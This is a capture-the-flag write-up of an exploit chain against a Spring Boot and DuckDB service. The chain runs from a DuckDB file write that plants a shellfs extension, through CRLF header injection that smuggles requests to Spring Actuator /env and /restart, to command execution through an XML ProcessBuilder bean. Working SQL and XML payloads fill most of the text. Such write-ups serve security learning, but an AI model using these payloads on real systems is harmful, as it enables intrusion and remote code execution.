# Writeup

Beyond the bamboos peach flowers peep, three or two;

**Spring** water's warmth the **ducks** are first to know.

Seleng wormwood grows lush while asparagus sprouts;

It is time for the globefish to be in season now

-- Morning Scene on Spring River in Huichong, *Su Shi (Song Dynasty)*

## Exploit Chain Overview
1) Arbitrary file write via DuckDB: place malicious extension files into DuckDB's extension directory
2) SSRF via DuckDB: `CREATE SECRET http_auth (TYPE http, EXTRA_HTTP_HEADERS MAP {...})` allows CRLF header injection to smuggle a second HTTP request
   - Call `POST /actuator/env` to:
     - Modify datasource URL to allow unsigned extensions, bypassing `SET allow_unsigned_extensions=false;`
     - Or modify `spring.main.sources` to let Spring to load new bean.
   - Call `POST /actuator/restart` to restart the application
5) Load the malicious extension and capture the flag

## Step 1: Upload malicious extension

Searching the extension list, we found [shellfs](https://duckdb.org/community_extensions/extensions/shellfs). Since the server has no network connection, we consider uploading this extension to the server for DuckDB to load. 

From DuckDB's docs, the [Copy Statement](https://duckdb.org/docs/stable/sql/statements/copy) can write files. Use FORMAT BLOB to preserve the binary exactly.

Upload the `.info` and the extension binary:

```sql
COPY (SELECT from_base64('<base64(shellfs.duckdb_extension.info)>') AS s)
TO '~/.duckdb/extensions/v1.4.1/linux_amd64/shellfs.duckdb_extension.info' (FORMAT BLOB);

COPY (SELECT from_base64('<base64(shellfs.duckdb_extension)>') AS s)
TO '~/.duckdb/extensions/v1.4.1/linux_amd64/shellfs.duckdb_extension' (FORMAT BLOB);
```

## Step 2: SSRF + CRLF smuggling to modify config

The `application.properties` clearly states:
```properties
management.endpoints.web.exposure.include=*
management.endpoint.env.post.enabled=true
management.endpoint.restart.enabled=true
```

Evidently, SSRF to `127.0.0.1:8081` on Spring Actuator can cause RCE by modifying env and restart. Then is SSRF, from the documentation and code, we can find [HTTPFS](https://duckdb.org/docs/stable/core_extensions/httpfs/https). However, after debugging and reviewing the code, it's easy to find that `read_csv('http://...')` only uses the GET method. The entire codebase, apart from writing files to S3, does not use POST/PUT anywhere.

However, by reading the documentation, we can notice the `EXTRA_HTTP_HEADERS` parameter. Fuzzing it ourselves, or [reading the code](https://github.com/duckdb/duckdb/blob/44b706b2b79dbc04df8396da698f256acac07dc1/third_party/httplib/httplib.hpp), it's easy to find that this header can be injected with CRLF. (Using curl might avoid this problem, but it defaults to httplib.)

There are two approaches.

#### JDBC + DuckDB

Therefore, we can use `/actuator/env` to modify the datasource URL, allowing unsigned extensions. `;allow_unsigned_extensions=1` can be seen in this [Issue](https://github.com/duckdb/duckdb-java/pull/237).

In addition, before running our SQL
```java
jdbcTemplate.execute("SET allow_community_extensions=false;SET allow_unsigned_extensions=false;"); 
```
forced extension loading to be prohibited, so the SQL must be executed before this. By [reading the code](https://github.com/duckdb/duckdb-java/blob/d00260ed2b7ea865c3146cbfd3935781e1d208d8/src/main/java/org/duckdb/DuckDBDriver.java#L47), we can see the `session_init_sql_file` configuration, which can run SQL during JDBC connection.

```sql
; Write the following line to /tmp/session.sql by COPY TO statement.
load shellfs; COPY (SELECT * from read_csv('/readflag |', columns={'a':'blob'})) TO '/tmp/a.txt' (FORMAT BLOB); 

CREATE SECRET http_auth (
  TYPE http,
  EXTRA_HTTP_HEADERS MAP {
    'AAAA': url_decode(
      'x%0d%0aConnection%3a%20keep-alive%0d%0aHost%3a%20127.0.0.1%3a8081%0d%0a%0d%0a'
      'POST%20/actuator/env%20HTTP/1.1%0d%0a'
      'Content-Type%3a%20application/json%0d%0aHost%3a%20127.0.0.1%3a8081%0d%0aContent-Length%3a%20131%0d%0a%0d%0a'
      '{"name":"spring.datasource.url","value":"jdbc:duckdb:/tmp/c.db;session_init_sql_file=/tmp/session.sql;allow_unsigned_extensions=1"}'
      '%0d%0aGET%20/%20HTTP/1.1'
    )
  }
);

SELECT * FROM read_csv('http://127.0.0.1:8081/');
```

#### spring.main.sources

Up to now, most posts online seem to use [Groovy](https://0xn3va.gitbook.io/cheat-sheets/framework/spring/spring-boot-actuators) to modify this parameter. However, Gemini 3 suggested a new approach.

Reading the following code:
- [BeanDefinitionLoader.java#L176](https://github.com/spring-projects/spring-boot/blob/811ddcd1b80cb8691d46fec105e9ea6daeed986a/core/spring-boot/src/main/java/org/springframework/boot/BeanDefinitionLoader.java#L176) — besides Groovy, `spring.main.sources` also supports XML
- [WithSampleBeansXmlResource.java#L35](https://github.com/spring-projects/spring-boot/blob/811ddcd1b80cb8691d46fec105e9ea6daeed986a/core/spring-boot/src/test/java/org/springframework/boot/WithSampleBeansXmlResource.java#L35) — XML example

We can see that `spring.main.sources` oddly supports defining a bean via XML, so the approach becomes obvious.

```python
xml_payload = """<beans xmlns="http://www.springframework.org/schema/beans"
   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
   xsi:schemaLocation="http://www.springframework.org/schema/beans
   http://www.springframework.org/schema/beans/spring-beans.xsd">
<bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
    <constructor-arg>
        <list>
            <value>bash</value>
            <value>-c</value>
            <value>/readflag &gt; /tmp/a.txt</value>
        </list>
    </constructor-arg>
</bean>
</beans>"""
write_file("/tmp/pwn.xml", xml_payload)
# spring.main.sources=/tmp/pwn.xml
```

## Step 3: Restart the application

Similarly, smuggle a restart request via CRLF injection:

```sql
CREATE OR REPLACE SECRET http_auth (
  TYPE http,
  EXTRA_HTTP_HEADERS MAP {
    'AAAA': url_decode(
      'x%0d%0aConnection%3a%20keep-alive%0d%0aHost%3a%20127.0.0.1%3a8081%0d%0a%0d%0a'
      'POST%20/actuator/restart%20HTTP/1.1%0d%0a'
      'Content-Type%3a%20application/json%0d%0aHost%3a%20127.0.0.1%3a8081%0d%0aContent-Length%3a%202%0d%0a%0d%0a'
      '{}'
      '%0d%0aGET%20/%20HTTP/1.1'
    )
  }
);

SELECT * FROM read_csv('http://127.0.0.1:8081/');
```

## Step 4: Get the flag

After the app restarts, get the flag

```json
{"sql": "select * from read_csv('/tmp/a.txt',header = false);"}
```